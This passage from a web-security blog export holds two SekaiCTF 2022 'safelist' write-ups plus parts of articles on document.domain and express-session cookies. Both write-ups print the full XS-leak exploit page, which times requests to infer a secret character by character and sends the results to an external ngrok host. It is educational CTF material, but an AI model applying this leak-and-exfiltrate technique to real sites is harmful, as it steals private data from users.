&#39;alice.example.com&#39;, they become the same origin-domain and can access each other’s DOM because it does not look at the port. Case 3: I am not who I used to beSuppose http://alice.example.com embeds itself in an iframe. The iframe and the original page are obviously the same origin and can access each other’s DOM. However, if I execute document.domain = &#39;alice.example.com&#39; on the page, the page will be set with a domain attribute, and the page in the iframe will not have a domain attribute, so they will no longer be the same origin-domain. The fade-out and exit of document.domainUsing this trick to relax the same-origin restriction should have been available for a long time, and it has not been removed until now to be compatible with early behavior. I guess many web pages used this trick in the early days to access same-site but cross-origin pages. But this approach is obviously risky. For example, if a subdomain has an XSS vulnerability, there is a chance to use this method to expand the scope of influence. In an article written by @fin1te in 2016, An XSS on Facebook via PNGs &amp; Wonky Content Types, this technique was used to successfully perform XSS from a subdomain to www.facebook.com, increasing the impact of the vulnerability. Also, due to security issues, Chrome published an article on January 11, 2022, in which it announced that it will disable modifying document.domain to relax the same-origin policy: Chrome will disable modifying document.domain to relax the same-origin policy. The article explains that starting from Chrome 101, the support for changing document.domain will be stopped. The original behavior can be replaced by postMessage or Channel Messaging API, but it requires writing more code, as it is not as convenient as directly manipulating the DOM. If a web page wants to continue using the document.domain modification feature, it needs to include Origin-Agent-Cluster: ?0 in the response header to continue using it. The article also includes a related discussion thread about this change: Deprecating document.domain setter. #564. ConclusionI seem to have learned this trick two or three years ago, knowing that by changing document.domain, two websites can be changed from cross origin to same origin. However, I have never seen anyone use it in practice. The reason why I wanted to write this article is because I saw the article attached at the end a few days ago and learned that this trick will be disabled by default in Chrome in the near future. Although the starting point was just to write about this behavior, I also paid attention to some blind spots that I had not noticed before in the process of looking at the origin and site definitions and reading the spec, such as same site checking public suffix. There are actually more details to talk about regarding origin, such as what is an opaque origin? But on the one hand, if I keep talking, it will be too long, and on the other hand, I haven’t studied it carefully yet. I will leave some reference materials and fill this gap in the future if I have the opportunity: What is an “opaque origin” and why do we care? #321 chromium&#x2F;src&#x2F;+&#x2F;HEAD&#x2F;url&#x2F;origin.h File origins Finally, I hope this article has helped everyone understand what same origin and same site are, as well as more detailed same origin-domain and schemelessly same site. Reference: HTML spec URL spec How to determine if two domains have the same owner? Chrome will disable modifying document.domain to relax the same-origin policy","link":"/2022/01/16/en/same-site-to-same-origin-document-domain/"},{"title":"SekaiCTF 2022 - safelist writeup","text":"I got first blood for a challenge called “safelist” in SekaiCTF 2022, it’s a challenge about xsleaks and request timing in particular, here is my writeup. Challenge description: Safelist™ is a completely safe list site to hold all your important notes! I mean, look at all the security features we have, we must be safe! Source code: https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/safelist The website is simple, you can either create or delete a note, also there is an admin bot to visit the URL you provided. What’s unique about this challenge is that it sets a lot of security headers: app.use((req, res, next) => &#123; res.locals.nonce = crypto.randomBytes(32).toString(\"hex\"); // Surely this will be enough to protect my website // Clueless res.setHeader(\"Content-Security-Policy\", ` default-src 'self'; script-src 'nonce-$&#123;res.locals.nonce&#125;' 'unsafe-inline'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; `.trim().replace(/\\s+/g, \" \")); res.setHeader(\"Cache-Control\", \"no-store\"); res.setHeader(\"X-Frame-Options\", \"DENY\"); res.setHeader(\"X-Content-Type-Options\", \"nosniff\"); res.setHeader(\"Referrer-Policy\", \"no-referrer\"); res.setHeader(\"Cross-Origin-Embedder-Policy\", \"require-corp\"); res.setHeader(\"Cross-Origin-Opener-Policy\", \"same-origin\"); res.setHeader(\"Cross-Origin-Resource-Policy\", \"same-origin\"); res.setHeader(\"Document-Policy\", \"force-load-at-top\"); if (!req.session.id) &#123; req.session.id = crypto.randomUUID(); &#125; if (!users.has(req.session.id)) &#123; users.set(req.session.id, &#123; list: [] &#125;); &#125; req.user = users.get(req.session.id); next(); &#125;); Also, the note content is sanitized by DOMPurify.sanitize() before assigning it to innerHTML, so there is no way to do XSS. There is another special feature which caught my eye: app.post(\"/create\", (req, res) => &#123; let &#123; text &#125; = req.body; if (!text || typeof text !== \"string\") &#123; return res.end(\"Missing 'text' variable\") &#125; req.user.list.push(text.slice(0, 2048)); req.user.list.sort(); res.redirect(\"/\"); &#125;); When you create a note, the whole list will re-order. The flag format is ^SEKAI&#123;[a-z]+&#125;$. Knowing this, we can create a note before or after the flag. It’s pretty helpful for performing xsleak. For example, if we create a note like this([CHAR] can be anything between A to Z): [CHAR]&lt;canvas height=&quot;1200px&quot;&gt;&lt;/canvas&gt;&lt;div id=&quot;scroll&quot;&gt;&lt;/div&gt;, then we update the location to #scroll, if [CHAR] is before the flag, no scroll occurs. A scroll occurs if [CHAR] is after the flag. If we can detect this behavior, we can leak the flag char by char. But the problem is there is a Cross-Origin-Opener-Policy header. By setting this header, we can’t access the opened window: var w = window.open('https://safelist.ctf.sekai.team/') setTimeout(() => &#123; w.location = 'https://safelist.ctf.sekai.team/#scroll' // not working // even w.close() not working &#125;, 200) Basically, we lost all the controls on the opened window, we can just open it but can’t close or update its location. Then, I came up with another way to do the leak. Loading imageLazy loading image is a common technique for xsleaks, my idea is similar to the above, but just replace the scroll fragment with a lazy-loading image tag. We need to find a threshold to achieve something like this. The image is loaded when the note I created is before the flag. When the note is after the flag, image is not load because of loading=lazy attribute. The note content is something like this: A&lt;br&gt;&lt;canvas height=&quot;1850px&quot;&gt;&lt;/canvas&gt;&lt;br&gt;&lt;img loading=lazy src=/?img&gt; 1850px is a well-crafted number, you can find this threshold by testing it locally, and it’s worth mentioning that the threshold is different for normal and headless browsers. You need to test it on the headless browser to find the correct number(3350px in this case). What can we do next? If the image is cached, we can detect it by timing the request, but unfortunately, there is a Cache-Control: no-store header, so there is no cache at all. How about using the concurrent limit to detect? In Chrome, you can only send 6 concurrent requests for each host. The rest will be pending hence takes more time to complete. So, we can send another request from our page, if images are loaded, our request should take more time. This should work according to the solution from @terjanq, but at that time I used fetch for timing the request, and somehow the concurrent limit was not applied(maybe the partition key is different). You can watch these two videos for details: https://www.youtube.com/watch?v=ixyMZlIcnDI (Use script element to send request) https://www.youtube.com/watch?v=15CJQ9nzrxs (Use fetch to send request) But it’s okay. We can still leverage other things. Make server side busy?The server is running on Node.js, and we know that Node.js is single-threaded. What does this mean? This means it can only process one request at the same time. So, if you have time-consuming work, it may cause performance issues. When the server does some heavy job, the main thread is blocked, so the server can not process all other requests. Even if no endpoint does heave calculation in the challenge, we can still block the main thread for a bit when we send many requests. To sum up, the idea is like this: We create a note that starts with a CHAR(a-z) We keep using fetch to measure the response time If response time is less than the threshold, it means the CHAR is after the flag, so images are not load Otherwise, CHAR is before the flag The goal is to find a CHAR that time(CHAR)&gt;threshold &amp;&amp; time(CHAR+1)&lt;threshold Below is the screenshot for trying two different chars. For the note that starts with SEKAI&#123;z, the load time is 0.9s (for 30 requests), which means the images are not loaded. For SEKAI&#123;m, the load time is 1.7s which is much more than z, which means the correct char is between m to y. By the way, we can use binary search to speed up the searching part. Exploit: https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45 &lt;!DOCTYPE html> &lt;html> &lt;!-- The basic idea is to create a post with a lot of images which send request to \"/\" to block server-side nodejs main thread. If images are loading, the request to \"/\" is slower, otherwise faster. By using a well-crafted height, we can let note with \"A\" load image but note with \"Z\" not load. We can use fetch to measure the request time. --> &lt;body> &lt;button onclick=\"run()\">start&lt;/button> &lt;form id=f action=\"http://localhost:1234/create\" method=\"POST\" target=\"_blank\"> &lt;input id=inp name=\"text\" value=\"\"> &lt;/form> &lt;form id=f2 action=\"http://localhost:1234/remove\" method=\"POST\" target=\"_blank\"> &lt;input id=inp2 name=\"index\" value=\"\"> &lt;/form> &lt;script> let flag = 'SEKAI&#123;' const TARGET = 'https://safelist.ctf.sekai.team' f.action = TARGET + '/create' f2.action = TARGET + '/remove' const sleep = ms => new Promise(r => setTimeout(r, ms)) const send = data => fetch('http://server.ngrok.io?d='+data) const charset = 'abcdefghijklmnopqrstuvwxyz'.split('') // start exploit let count = 0 setTimeout(async () => &#123; let L = 0 let R = charset.length - 1 while( (R-L)>3 ) &#123; let M = Math.floor((L + R) / 2) let c = charset[M] send('try_' + flag + c) const found = await testChar(flag + c) if (found) &#123; L = M &#125; else &#123; R = M - 1 &#125; &#125; // fallback to linear since I am not familiar with binary search lol for(let i=R; i>=L; i--) &#123; let c = charset[i] send('try_' + flag + c) const found = await testChar(flag + c) if (found) &#123; send('found: '+ flag+c) flag += c break &#125; &#125; &#125;, 0) async function testChar(str) &#123; return new Promise(resolve => &#123; /* For 3350, you need to test it on your local to get this number. The basic idea is, if your post starts with \"Z\", the image should not be loaded because it's under lazy loading threshold If starts with \"A\", the image should be loaded because it's in the threshold. */ inp.value = str + '&lt;br>&lt;canvas height=\"3350px\">&lt;/canvas>&lt;br>'+Array.from(&#123;length:20&#125;).map((_,i)=>`&lt;img loading=lazy src=/?$&#123;i&#125;>`).join('') f.submit() setTimeout(() => &#123; run(str, resolve) &#125;, 500) &#125;) &#125; async function run(str, resolve) &#123; // if the request is not enough, we can send more by opening more window for(let i=1; i&lt;=5;i++) &#123; window.open(TARGET) &#125; let t = 0 const round = 30 setTimeout(async () => &#123; for(let i=0; i&lt;round; i++) &#123; let s = performance.now() await fetch(TARGET + '/?test', &#123; mode: 'no-cors' &#125;).catch(err=>1) let end = performance.now() t += end - s console.log(end - s) &#125; const avg = t/round send(str + \",\" + t + \",\" + \"avg:\" + avg) /* I get this threshold(1000ms) by trying multiple times on remote admin bot for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold */ const isFound = (t >= 1000) if (isFound) &#123; inp2.value = \"0\" &#125; else &#123; inp2.value = \"1\" &#125; // remember to delete the post to not break our leak oracle f2.submit() setTimeout(() => &#123; resolve(isFound) &#125;, 200) &#125;, 200) &#125; &lt;/script> &lt;/body> &lt;/html>","link":"/2022/10/05/en/sekaictf2022-safelist-xsleak/"},{"title":"SekaiCTF 2022 Notes and Concurrent Limit","text":"I casually played SekaiCTF 2022 last weekend and I have to say that the visual style is pretty cool. You can tell that a lot of effort was put into it, and it feels like a game. This time, I only played two web challenges. I got first blood on the safelist of xsleak, but I couldn’t solve the other one. It’s a bit of a shame (when justCatTheFish solved it, I was wondering who was so powerful, but after the competition, I found out that it was terjanq lol). In this post, I will write about the solution for safelist and Obligatory Calc. If you want to see other web challenges, you can check out lebr0nli’s blog: SekaiCTF 2022 Writeups Keywords: xsleak lazy loading image 6 concurrent request limit socket pool null origin null e.source Challenge Description: Safelist™ is a completely safe list site to hold all your important notes! I mean, look at all the security features we have, we must be safe! Source code: https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/safelist This challenge is quite simple. You can add and delete notes, and because it is a client-side challenge, there is an admin bot that can provide a URL for it to visit. The special thing about this challenge is that it sets a lot of headers, some of which I have never seen before: app.use((req, res, next) => &#123; res.locals.nonce = crypto.randomBytes(32).toString(\"hex\"); // Surely this will be enough to protect my website // Clueless res.setHeader(\"Content-Security-Policy\", ` default-src 'self'; script-src 'nonce-$&#123;res.locals.nonce&#125;' 'unsafe-inline'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; `.trim().replace(/\\s+/g, \" \")); res.setHeader(\"Cache-Control\", \"no-store\"); res.setHeader(\"X-Frame-Options\", \"DENY\"); res.setHeader(\"X-Content-Type-Options\", \"nosniff\"); res.setHeader(\"Referrer-Policy\", \"no-referrer\"); res.setHeader(\"Cross-Origin-Embedder-Policy\", \"require-corp\"); res.setHeader(\"Cross-Origin-Opener-Policy\", \"same-origin\"); res.setHeader(\"Cross-Origin-Resource-Policy\", \"same-origin\"); res.setHeader(\"Document-Policy\", \"force-load-at-top\"); if (!req.session.id) &#123; req.session.id = crypto.randomUUID(); &#125; if (!users.has(req.session.id)) &#123; users.set(req.session.id, &#123; list: [] &#125;); &#125; req.user = users.get(req.session.id); next(); &#125;); I have written about the CO series before, but I really tried it this time and found that some of them are a bit different from what I understood. For example, I thought that Cross-Origin-Opener-Policy meant “when a page with this setting is opened with window.open, the opened window will not have an opener”, but later I found out that it should be bidirectional, that is, “when I open a page with this setting from another page, I cannot access it”. Document-Policy is also cool. force-load-at-top should be used to prohibit Scroll-to-text-fragment and #abc anchor. In addition, the content of the note will also be filtered by DOMPurify.sanitize(). When encountering such challenges, there are basically a few directions: Meta can be used Style can be used Window DOM clobbering can be used (not for document) Img can be used to send requests When I first looked at the code, I quickly found a suspicious place: app.post(\"/create\", (req, res) => &#123; let &#123; text &#125; = req.body; if (!text || typeof text !== \"string\") &#123; return res.end(\"Missing 'text' variable\") &#125; req.user.list.push(text.slice(0, 2048)); req.user.list.sort(); res.redirect(\"/\"); &#125;); When you add a note, the entire note will be re-sorted. The flag format for this challenge has special instructions, which is ^SEKAI&#123;[a-z]+&#125;$, and the flag format is relatively simple. We can use this sorting function to add a note “before the flag” or “after the flag” to do xsleak. My initial idea was to construct a payload like this: [CHAR]&lt;canvas height=&quot;1200px&quot;&gt;&lt;/canvas&gt;&lt;div id=&quot;scroll&quot;&gt;&lt;/div&gt; The key is to achieve: If [CHAR] is in front of the flag, nothing will happen when you update the location to #scroll (because #scroll can be seen without scrolling) If [CHAR] is behind the flag, the page will scroll to the specified location when you update the location to #scroll (because scrolling is required) If you can detect this scrolling behavior and find the matching height, you can know whether [CHAR] is in front of or behind the flag, and then you can know the nth character of the flag. For example, if SEKAI&#123;x does not scroll, and SEKAI&#123;y does scroll, then we know that the first letter of the flag must be x. The problem is that I couldn’t find a way to detect scrolling. There is a method on the xsleak wiki that requires an iframe, but it doesn’t work for this problem. Also, just updating the location won’t work because of the Cross-Origin-Opener-Policy mentioned earlier, which gives you no control over the opened window, not even the ability to close it: var w = window.open('https://safelist.ctf.sekai.team/') setTimeout(() => &#123; w.location = 'https://safelist.ctf.sekai.team/#scroll' // not working // even w.close() not working &#125;, 200) No problem, I came up with another method later. Loading imageIn xsleak problems, lazy loading images are quite common, and the method I thought of is actually similar to the previous one, except that we replace the #scroll element with an image. The goal is still to find the correct value, which we call the threshold. We can achieve behavior like the following: if the note is before the flag, the image will load: If the note is below the flag, the image will not load due to lazy loading: The content of the note looks like this: A&lt;br&gt;&lt;canvas height=&quot;1850px&quot;&gt;&lt;/canvas&gt;&lt;br&gt;&lt;img loading=lazy src=/?img&gt; Here, 1850px is the value I tested on my own browser. As for the remote admin bot, you can first run a headless browser locally and then slowly adjust and test it. The value I finally found was 3350px. Next, as long as we can find a way to detect whether the image has loaded, we can infer the order of the flag and leak out the entire flag one character at a time. The usual way is to use cache, but this problem has a special setting of Cache-Control: no-store, so we cannot use cache. What about the concurrent limit? In the case of HTTP 1.1, the browser can only open a maximum of 6 connections to a host at the same time, so if we load a lot of images and then time the requests on another page, the speed should be much slower because the connection is blocked. But I tried this trick and found that it didn’t work. Although I did load a lot of images, on the other side, I used fetch to test and the connection was not blocked. So I thought at the time that this limit should be for “each page”, meaning that when I send a request to target.com from a.com, I can only open 6 at the same time, but I can open 6 at the same time on b.com, and each page is separated. But even if the connection is not blocked by the browser, it doesn’t matter because the server is still affected. The server is busyThe server for this problem runs on Node.js, which is single-threaded, meaning it can only handle one request at a time, and other requests will be queued. Therefore, in development, we avoid some “synchronous and time-consuming” work because it causes performance issues, such as: app.get('/heavy', (req, res) => &#123; const result = heavyMathCalculation() res.send(result) &#125;) app.get('/hello', (req, res) => &#123; res.send('hello') &#125;) When I send a request to &#x2F;heavy and then another to &#x2F;hello, &#x2F;hello won’t receive a response until heavyMathCalculation is finished. Although there is no such time-consuming work in this problem, if we send a lot of requests, the server still needs time to process them, so there will still be differences in response time. To summarize, the idea is roughly as follows: Create a note with CHAR at the beginning Continuously use fetch to detect response time If the response time is less than the threshold, it means that CHAR is behind the flag, so the image is not loaded Conversely, if the response time is greater than the threshold, it means that CHAR is in front of the flag because the image loading slows down the server The goal is to find a CHAR that satisfies the following conditions: time(CHAR)&gt;threshold &amp;&amp; time(CHAR+1)&lt;threshold Below are two screenshots. The first one is for SEKAI&#123;z&#125;, and the total loading time for fetch is 0.9 seconds (30 requests), which is relatively fast, indicating that the image was not loaded: This one is for SEKAI&#123;m&#125;, and the loading time is 1.7s, which is obviously much longer than z, so the first character must be in the range of m~y. As long as you do a modified binary search, you can quickly find which character it is. My final script is as follows (you can get one character per run): https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45 &lt;!DOCTYPE html> &lt;html> &lt;!-- The basic idea is to create a post with a lot of images which send request to \"/\" to block server-side nodejs main thread. If images are loading, the request to \"/\" is slower, otherwise faster. By using a well-crafted height, we can let note with \"A\" load image but note with \"Z\" not load. We can use fetch to measure the request time. --> &lt;body> &lt;button onclick=\"run()\">start&lt;/button> &lt;form id=f action=\"http://localhost:1234/create\" method=\"POST\" target=\"_blank\"> &lt;input id=inp name=\"text\" value=\"\"> &lt;/form> &lt;form id=f2 action=\"http://localhost:1234/remove\" method=\"POST\" target=\"_blank\"> &lt;input id=inp2 name=\"index\" value=\"\"> &lt;/form> &lt;script> let flag = 'SEKAI&#123;' const TARGET = 'https://safelist.ctf.sekai.team' f.action = TARGET + '/create' f2.action = TARGET + '/remove' const sleep = ms => new Promise(r => setTimeout(r, ms)) const send = data => fetch('http://server.ngrok.io?d='+data) const charset = 'abcdefghijklmnopqrstuvwxyz'.split('') // start exploit let count = 0 setTimeout(async () => &#123; let L = 0 let R = charset.length - 1 while( (R-L)>3 ) &#123; let M = Math.floor((L + R) / 2) let c = charset[M] send('try_' + flag + c) const found = await testChar(flag + c) if (found) &#123; L = M &#125; else &#123; R = M - 1 &#125; &#125; // fallback to linear since I am not familiar with binary search lol for(let i=R; i>=L; i--) &#123; let c = charset[i] send('try_' + flag + c) const found = await testChar(flag + c) if (found) &#123; send('found: '+ flag+c) flag += c break &#125; &#125; &#125;, 0) async function testChar(str) &#123; return new Promise(resolve => &#123; /* For 3350, you need to test it on your local to get this number. The basic idea is, if your post starts with \"Z\", the image should not be loaded because it's under lazy loading threshold If starts with \"A\", the image should be loaded because it's in the threshold. */ inp.value = str + '&lt;br>&lt;canvas height=\"3350px\">&lt;/canvas>&lt;br>'+Array.from(&#123;length:20&#125;).map((_,i)=>`&lt;img loading=lazy src=/?$&#123;i&#125;>`).join('') f.submit() setTimeout(() => &#123; run(str, resolve) &#125;, 500) &#125;) &#125; async function run(str, resolve) &#123; // if the request is not enough, we can send more by opening more window for(let i=1; i&lt;=5;i++) &#123; window.open(TARGET) &#125; let t = 0 const round = 30 setTimeout(async () => &#123; for(let i=0; i&lt;round; i++) &#123; let s = performance.now() await fetch(TARGET + '/?test', &#123; mode: 'no-cors' &#125;).catch(err=>1) let end = performance.now() t += end - s console.log(end - s) &#125; const avg = t/round send(str + \",\" + t + \",\" + \"avg:\" + avg) /* I get this threshold(1000ms) by trying multiple times on remote admin bot for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold */ const isFound = (t >= 1000) if (isFound) &#123; inp2.value = \"0\" &#125; else &#123; inp2.value = \"1\" &#125; // remember to delete the post to not break our leak oracle f2.submit() setTimeout(() => &#123; resolve(isFound) &#125;, 200) &#125;, 200) &#125; &lt;/script> &lt;/body> &lt;/html> Post-match ReviewAfter the game, I saw terjanq’s solution. He used &lt;script&gt; to do timing, while I used fetch. The difference is that in his case, the loading of &lt;script&gt; was blocked! I have recorded two videos below to show the difference: https://www.youtube.com/watch?v=ixyMZlIcnDI using script https://www.youtube.com/watch?v=15CJQ9nzrxs using fetch You can see that in the first case, it should be “each page shares the same limit”, which means that the legendary “6 concurrent requests” is for the destination, not like what I previously thought, each page has its own pool. But in the second case, it doesn’t seem to be the case, which is also the reason why I misunderstood during the competition. When I asked terjanq, he said it might be due to the difference in partition key. I originally wanted to find the answer in the Chromium source code, but found that my skills were too shallow and I could only find the socket pool per group that everyone can find: https://source.chromium.org/chromium/chromium/src/+/refs/tags/107.0.5261.1:net/socket/client_socket_pool_manager.cc;l=51 // Default to allow up to 6 connections per host. Experiment and tuning may // try other values (greater than 0). Too large may cause many problems, such // as home routers blocking the connections!?!? See http://crbug.com/12066. // // WebSocket connections are long-lived, and should be treated differently // than normal other connections. Use a limit of 255, so the limit for wss will // be the same as the limit for ws. Also note that Firefox uses a limit of 200. // See http://crbug.com/486800 int g_max_sockets_per_group[] = &#123; 6, // NORMAL_SOCKET_POOL 255 // WEBSOCKET_SOCKET_POOL &#125;; I didn’t find where the difference was when I sent a request with fetch and when I sent a request with &lt;script&gt;. But I did some experiments later. I prepared three hosts: A: http://exp.test:1234B: http://example.comC: http://test.ngrok.io(target) Simply put, C is the target, and C has an endpoint that will give a response after three seconds. Then I tested with AB and AC respectively to see what would happen under different conditions. The code is roughly like this: &lt;body> &lt;button onclick=startFetch()>start fetch&lt;/button> &lt;button onclick=startScript()>start script&lt;/button> &lt;button onclick=startImg()>start img&lt;/button> &lt;/body> &lt;script> const round = 20 function startFetch() &#123; for(let i=0; i&lt;20; i++)&#123; fetch('http://test.ngrok.io/block?q='+i, &#123; mode: 'no-cors' &#125;) &#125; &#125; function startScript() &#123; for(let i=0; i&lt;20; i++)&#123; let el = document.createElement('script') el.src = 'http://test.ngrok.io/block?q='+i document.body.appendChild(el) &#125; &#125; function startImg() &#123; for(let i=0; i&lt;20; i++)&#123; let el = document.createElement('img') el.crossorigin='anonymous' el.src = 'http://test.ngrok.io/block?q='+i document.body.appendChild(el) &#125; &#125; &lt;/script> For example, when A fetches data from C and B also fetches data from C, the one who fetches first wins, and the one who fetches later has to queue, which means that the two share the same connection pool. If A uses fetch and B uses img, the two do not interfere with each other, which means that the two use different pools. In short, the final situation I tested is: “fetch and script&#x2F;img are two different pools.” Then I tested A and C, where C represents fetching data from itself. The result is quite magical. If I use fetch for both A and C, the two do not interfere with each other. But if I use img for A and fetch for C, C’s fetch will take priority, and A’s img needs to queue. Based on the final test results, I summarized that there are two pools in total: Fetch from other hosts to the target host Fetch from oneself to oneself &amp; loading of script&#x2F;img Originally, I expected all of these to share the same pool, but it seems that fetch from other hosts is an additional pool, although I don’t know why. Finally, here is the author’s writeup: https://brycec.me/posts/sekaictf_2022_challenges I haven’t read it carefully yet, but it is related to the restriction of all connection pools. And recommend an excellent article: How browsers load resources from Chrome source code Obligatory CalcJust briefly describe the solution to this problem: The e.source in onmessage is the source window that sends the message. Although it looks like an object at first glance, if it is closed immediately after postMessage, it will become null. Accessing document.cookie under the sandbox iframe will result in an error.","link":"/2022/10/08/en/sekaictf2022-safelist-and-connection/"},{"title":"In-depth Session and Cookie: Implementation in Express, PHP, and Rails","text":"IntroductionThis is a series of three articles that I call the Session and Cookie Trilogy. The goal of the series is to discuss this classic topic from shallow to deep, from understanding concepts to understanding implementation methods. This is the last article in the series, and the complete links to the three articles are as follows: Plain Talk on Session and Cookie: Starting with Running a Grocery Store Shallow Talk on Session and Cookie: Let’s Read RFC Together In-depth Session and Cookie: Implementation in Express, PHP, and Rails The first article talks about Session and Cookie in plain language without too many technical terms. The second article directly looks at the three RFCs of Cookie to understand what Session is, and also supplements some knowledge related to Cookie. This article will delve into Session and take a look at three different Session implementation methods. These three are Node.js Web framework Express, PHP, and Ruby on Rails. I chose these three because their implementation of Session mechanism is different, and I think they are suitable objects for reference. Okay, let’s get started! ExpressExpress itself is an extremely lightweight framework with many basic functions under other frameworks, which need to be installed with middleware to use. Let’s start with a brief introduction to the concept of middleware. In Express, when a Request is received, it is handed over to the corresponding middleware for processing, and after processing, it becomes a Response returned. So the essence of Express is actually a bunch of middleware. If we explain it with a picture, it would look like this: For example, a basic code segment would look like this: const express = require('express') const app = express() const port = 5001 // global 的 middleware app.use((req, res, next) => &#123; req.greeting = 'hello' next() &#125;) // 特定 route 的 middleware app.get('/', (req, res) => &#123; res.end(req.greeting) &#125;) app.listen(port, () => &#123; console.log(`Example app listening on port $&#123;port&#125;!`) &#125;) The first middleware is global, so any request will first reach this middleware, and you can set some things for the req or res parameters here, and finally call next to transfer control to the next middleware. The next middleware can get the information processed by the previous middleware and output the content. If next is not called, it means that you do not want to transfer control to the next middleware. In Express, the middleware that manages Session is express-session, and the sample code looks like this (rewritten from the official website example): const express = require('express') const session = require('express-session') const app = express() const port = 5001 // 使用 session middleware app.use(session(&#123; secret: 'keyboard cat' &#125;)) app.get('/', function(req, res, next) &#123; // 可以用 req.session 拿取存在 session 的值 // 這邊判斷有沒有 req.session.views // 如果有的話就 +1，反之初始化成 1 // 所以 req.session 可讀也可寫 if (req.session.views) &#123; req.session.views++ res.write('views: ' + req.session.views) res.end() &#125; else &#123; req.session.views = 1 res.end('welcome to the session demo. refresh!') &#125; &#125;) app.listen(port, () => &#123; console.log(`Example app listening on port $&#123;port&#125;!`) &#125;) After using the session middleware, you can directly use req.session.key to access the information you want. The same variable can be written and read, which is similar to PHP’s $_SESSION. Next, let’s take a look at the express-session code! The main code is in index.js, which is about 700 lines long and is unlikely to be explained line by line. And well-written libraries will spend a lot of effort on backward compatibility and data validity checks, which are some more trivial and less helpful things for understanding mechanisms. So I will simply organize the code, remove less important parts, and reorganize the code, and only select relevant paragraphs. We will focus on three key points: How sessionID is generated How sessionID is stored How session information is stored Let’s take a look at where sessionID is generated first: // get the session id generate function var generateId = opts.genid || generateSessionId // generates the new session store.generate = function(req)&#123; req.sessionID = generateId(req); req.session = new Session(req); req.session.cookie = new Cookie(cookieOptions); if (cookieOptions.secure === 'auto') &#123; req.session.cookie.secure = issecure(req, trustProxy); &#125; &#125;; function generateSessionId(sess) &#123; return uid(24); &#125; The customizability of express-session is high, as you can pass in your own function to generate the sessionID. If not passed, it defaults to using uid(24), where uid refers to the uid-safe library, which generates a random ID of length 24 bytes. The documentation specifically mentions this length: Asynchronously create a UID with a specific byte length. Because base64 encoding is used underneath, this is not the string length. For example, to create a UID of length 24, you want a byte length of 18. So if you input 24, the resulting string will have a length of 32 characters. So how is this sessionID stored in a cookie? var cookie = require('cookie') var signature = require('cookie-signature') // get the session cookie name var name = opts.name || opts.key || 'connect.sid' // get the cookie signing secret var secret = opts.secret if (secret &amp;&amp; !Array.isArray(secret)) &#123; secret = [secret]; &#125; // set-cookie onHeaders(res, function()&#123; // set cookie setcookie(res, name, req.sessionID, secrets[0], req.session.cookie.data); &#125;); function setcookie(res, name, val, secret, options) &#123; var signed = 's:' + signature.sign(val, secret); var data = cookie.serialize(name, signed, options); debug('set-cookie %s', data); var prev = res.getHeader('Set-Cookie') || [] var header = Array.isArray(prev) ? prev.concat(data) : [prev, data]; res.setHeader('Set-Cookie', header) &#125; The key for the sessionID stored in the cookie can also be specified, but the default is connect.sid, so when you see this key, you know it is the default sessionID name for express-session. The content is a bit special, starting with s: followed by the result of signature.sign(sessionID, secret). Here, we need to look at the cookie-signature library, with a simple example below: var cookie = require('cookie-signature'); var val = cookie.sign('hello', 'tobiiscool'); val.should.equal('hello.DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI'); What does the sign function do? The source code is simple: var crypto = require('crypto'); /** * Sign the given `val` with `secret`. * * @param &#123;String&#125; val * @param &#123;String&#125; secret * @return &#123;String&#125; * @api private */ exports.sign = function(val, secret)&#123; if ('string' != typeof val) throw new TypeError(\"Cookie value must be provided as a string.\"); if ('string' != typeof secret) throw new TypeError(\"Secret string must be provided.\"); return val + '.' + crypto .createHmac('sha256', secret) .update(val) .digest('base64') .replace(/\\=+$/, ''); &#125;; It simply generates a digest using hmac-sha256 for the content to be signed, and appends it to the end of the string, with . used to separate the data. If you don’t know what hmac is, it is simply a way to generate a digest for a message, to ensure data integrity and prevent tampering. You can think of it as a unique code corresponding to the message. If the message is changed, the code will also be different. In the example above, hello is signed using the tobiiscool secret, resulting in DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI. The complete string becomes hello.DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI, with my data in front and the digest at the end. If someone tries to tamper with the data, such as changing the front to hello2, the digest will not match the new data, and I will know that someone has tampered with the data. Therefore, this method is used to ensure data integrity, and the principle is similar to JWT. You can see the data, but you cannot change it, because any changes will be detected. You may wonder: why not encrypt the entire sessionID? Why use this method? I guess it’s because the original data is not afraid of being seen by others, but only afraid of being changed. If the original data is sensitive information, encryption will be used. However, since the original data is only the sessionID, it doesn’t matter if it is seen by others, as long as data integrity is ensured. Moreover, encryption requires more system resources than this message verification, so this method is used. So, going back to the beginning, express-session stores the sessionID in a cookie, with the key being connect.sid, and the value being s:&#123;sessionID&#125;.&#123;hmac-sha256(sessionID, secret)&#125;. If you are curious, you can go to any website that uses Express and check the cookie content to find the actual data (or run one yourself). Here’s an example using my own: my connect.sid is s%3AfZZVCDHefchle2LDK4PzghaR3Ao9NruG.J%2BsOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM, which becomes s:fZZVCDHefchle2LDK4PzghaR3Ao9NruG.J+sOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM after decoding special characters. In other words, my sessionID is fZZVCDHefchle2LDK4PzghaR3Ao9NruG, and the authentication code is J+sOPkTubkeMJ4EMBcnunPXW0Y7TWTucRSKIPNVgnRM. After knowing how to store the sessionID, it should be easy to understand how to retrieve it from the cookie by simply reversing the process: // get the session ID from the cookie var cookieId = req.sessionID = getcookie(req, name, secrets); function getcookie(req, name, secrets) &#123; var header = req.headers.cookie; var raw; var val; // read from cookie header if (header) &#123; var cookies = cookie.parse(header); raw = cookies[name]; if (raw) &#123; if (raw.substr(0, 2) === 's:') &#123; val = unsigncookie(raw.slice(2), secrets); if (val === false) &#123; debug('cookie signature invalid'); val = undefined; &#125; &#125; else &#123; debug('cookie unsigned') &#125; &#125; &#125; return val; &#125; /** * Verify and decode the given `val` with `secrets`. * * @param &#123;String&#125; val * @param &#123;Array&#125; secrets * @returns &#123;String|Boolean&#125; * @private */ function unsigncookie(val, secrets) &#123; for (var i = 0; i &lt; 